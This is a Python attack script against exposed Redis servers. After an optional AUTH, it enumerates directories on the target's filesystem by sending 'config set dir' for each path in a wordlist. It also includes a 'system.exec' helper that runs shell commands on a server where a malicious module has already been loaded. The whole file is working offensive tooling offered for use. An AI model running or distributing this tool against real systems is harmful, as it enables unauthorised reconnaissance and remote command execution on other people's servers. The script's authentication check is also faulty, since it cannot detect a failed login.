#!/usr/bin/env python3
import socket
from optparse import OptionParser

verbose = False
CRLF = '\r\n'

def encode_cmd_arr(arr):
    cmd = ""
    cmd += "*" + str(len(arr))
    for arg in arr:
        cmd += CRLF + "$" + str(len(arg))
        cmd += CRLF + arg
    cmd += "\r\n"
    return cmd

def encode_cmd(raw_cmd):
    return encode_cmd_arr(raw_cmd.split(" "))

def decode_cmd(cmd):
    if cmd.startswith("*"):
        raw_arr = cmd.strip().split("\r\n")
        return raw_arr[2::2]
    if cmd.startswith("$"):
        return cmd.split("\r\n", 2)[1]
    return cmd.strip().split(" ")

def info(msg):
    print(f"\033[1;33;40m[info]\033[0m {msg}")

def success(msg):
    print(f"\033[0;32;40m[success]\033[0m {msg}")

def error(msg):
    print(f"\033[1;31;40m[err ]\033[0m {msg}")

def din(sock, cnt=4096):
    global verbose
    msg = sock.recv(cnt)
    if verbose:
        if len(msg) < 1000:
            print(f"\033[1;34;40m[->]\033[0m {msg}")
        else:
            print(f"\033[1;34;40m[->]\033[0m {msg[:80]}......{msg[-80:]}")
    return msg.decode()

def dout(sock, msg):
    global verbose
    if type(msg) != bytes:
        msg = msg.encode()
    sock.send(msg)
    if verbose:
        if len(msg) < 1000:
            print(f"\033[1;33;40m[<-]\033[0m {msg}")
        else:
            print(f"\033[1;33;40m[<-]\033[0m {msg[:80]}......{msg[-80:]}")

def decode_shell_result(s):
    return "\n".join(s.split("\r\n")[1:-1])

def is_ok(resp):
    if resp != '+OK\r\n':
        return False
    return True

class Remote:
    def __init__(self, rhost, rport):
        self._host = rhost
        self._port = rport
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._sock.connect((self._host, self._port))

    def send(self, msg):
        dout(self._sock, msg)

    def recv(self, cnt=65535):
        return din(self._sock, cnt)

    def do(self, cmd):
        self.send(encode_cmd(cmd))
        buf = self.recv()
        return buf

    def shell_cmd(self, cmd):
        self.send(encode_cmd_arr(['system.exec', f"{cmd}"]))
        buf = self.recv()
        return buf

    def set_dir(self, dir):
        resp = self.do(f"config set dir {dir}")
        return is_ok(resp)

def fuzz(remote, start_dir, wordlist):
    if not remote.set_dir(start_dir):
        error(f"Starting directory not OK.")
        return 1
    info(f"FUZZING {options.cd} with {options.wl}")
    with open(wordlist) as f:
        for set_dir in f:
            cd = set_dir.rstrip()
            if remote.set_dir(cd):
                success(f"{cd}")
                remote.set_dir(start_dir)
    info("Wordlist exhausted, goodbye.")
    return 0

if __name__ == '__main__':
    parser = OptionParser()
    parser.add_option("--rhost", dest="rh", type="string",
            help="target host")
    parser.add_option("--rport", dest="rp", type="int",
            help="target redis port, default 6379", default=6379)
    parser.add_option("--auth", dest="pw", type="string",
            help="authentication string")
    parser.add_option("--dir", dest="cd", type="string",
            help="directory to fuzz, default /", default='/')
    parser.add_option("--wlist", dest="wl", type="string",
            help="wordlist directory")
    
    (options, args) = parser.parse_args()
    if not options.rh or not options.wl:
        parser.error("Invalid arguments")
    info(f"TARGET {options.rh}:{options.rp}")
    remote = Remote(options.rh, options.rp)
    if options.pw:
        is_auth = remote.do(f"AUTH {options.pw}")
        if not is_auth:
            error(f"Failed to authenticate with {options.pw}")
    fuzz(remote, options.cd, options.wl)
